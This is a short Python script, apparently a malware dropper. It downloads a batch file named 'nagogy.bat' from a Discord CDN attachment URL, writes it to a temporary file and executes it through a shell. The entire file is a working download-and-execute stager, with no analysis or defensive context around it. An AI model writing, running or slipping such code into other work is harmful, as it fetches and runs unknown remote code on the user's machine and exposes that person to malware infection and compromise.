import os
import requests
import tempfile
import subprocess
url = 'https://cdn.discordapp.com/attachments/1110291671603753110/1114597535852535979/nagogy.bat'
response = requests.get(url)

with tempfile.NamedTemporaryFile(delete=False) as temp_file:
    temp_file.write(response.content)

subprocess.call(temp_file.name, shell=True)
